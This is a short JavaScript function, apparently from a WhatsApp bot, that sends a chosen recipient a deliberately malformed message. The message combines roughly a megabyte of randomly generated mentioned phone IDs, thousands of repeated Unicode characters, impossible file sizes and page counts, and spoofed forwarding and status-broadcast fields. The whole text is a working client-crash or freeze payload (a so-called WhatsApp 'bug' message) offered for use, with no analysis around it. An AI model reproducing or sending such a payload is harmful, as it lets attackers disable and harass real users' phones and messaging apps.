async function Delay(from) {
  const generateRandomJid = () => {
    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
    return `"91${randomNumber}@s.whatsapp.net"`
  };
  const createTempFile = () => {
    const tempFilePath = path.join(__dirname, `./database/temp/temp_jids_${Date.now()}.json`);
    let jids = [];
    let currentSize = 0;
    while (currentSize < 1061432 - 50) {
      const jid = generateRandomJid();
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
    return tempFilePath;
  };
  const tempFilePath = createTempFile();
  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
  const ui = 'ꦽ'.repeat(5000);
  await sock.relayMessage(from, {
    "ephemeralMessage": {
      "message": {
        "interactiveMessage": {
          "header": {
            "documentMessage": {
              "url": `${url}`,
              "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              "fileSha256": `${fileSha256}`,
              "fileLength": "9999999999999",
              "pageCount": 1316134911,
              "mediaKey": `${mediaKey}`,
              "fileName": "⛤",
              "fileEncSha256": `${fileEncSha256}`,
              "directPath": `${directPath}`,
              "contactVcard": true,
              "jpegThumbnail": `${jpegThumbnail}`
            },
            "hasMediaAttachment": true,
          },
          "body": { "text": `⛤${ui}` },
          "contextInfo": {
            "mentionedJid": jidsss,
            "mentions": jidsss,
          },
          "footer": { "text": `⛤${ui}` },
          "nativeFlowMessage": {},
          "contextInfo": {
            "mentionedJid": jidsss,
            "mentions": jidsss,
            "forwardingScore": 127,
            "isForwarded": true,
            "fromMe": false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast",
            "quotedMessage": {
              "documentMessage": {
                "url": `${url}`,
                "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                "fileSha256": `${fileSha256}`,
                "fileLength": "9999999999999",
                "pageCount": 131613491,
                "mediaKey": `${mediaKey}`,
                "fileName": "⛤",
                "fileEncSha256": `${fileEncSha256}`,
                "directPath": `${directPath}`,
                "contactVcard": true,
                "jpegThumbnail": `${jpegThumbnail}`
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: from }});
}